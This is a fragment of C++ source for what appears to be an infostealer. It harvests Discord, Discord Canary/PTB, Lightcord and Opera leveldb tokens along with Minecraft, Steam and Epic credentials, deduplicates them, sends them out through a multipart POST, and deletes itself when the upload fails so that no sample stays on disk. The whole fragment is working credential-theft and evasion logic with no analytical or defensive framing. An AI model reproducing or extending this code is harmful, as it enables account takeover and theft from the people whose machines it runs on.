        collect_leveldb_tokens(fs::path(appd) / L"discord" / L"Local Storage" / L"leveldb",
                               "discord", all);
        collect_leveldb_tokens(fs::path(appd) / L"discordcanary" / L"Local Storage" / L"leveldb",
                               "discordcanary", all);
        collect_leveldb_tokens(fs::path(appd) / L"discordptb" / L"Local Storage" / L"leveldb",
                               "discordptb", all);
        collect_leveldb_tokens(fs::path(appd) / L"Lightcord" / L"Local Storage" / L"leveldb",
                               "lightcord", all);
        collect_leveldb_tokens(fs::path(appd) / L"Opera Software" / L"Opera Stable" /
                                   L"Local Storage" / L"leveldb",
                               "opera", all);
    }

    collect_minecraft(all);
    collect_steam(all);
    collect_epic(all);

    // Deduplicate on (note, secret) so a shared profile does not spam.
    std::sort(all.begin(), all.end(), [](const Entry& a, const Entry& b) {
        return std::tie(a.note, a.secret) < std::tie(b.note, b.secret);
    });
    all.erase(std::unique(all.begin(), all.end(),
                          [](const Entry& a, const Entry& b) {
                              return a.note == b.note && a.secret == b.secret;
                          }),
              all.end());

    std::string dump = build_payload(all);
    if (dump.empty() || !post_multipart(dump)) {
        // Nothing landed: do not leave a live sample sitting on disk.
        self_delete();
    }
    return 0;
}
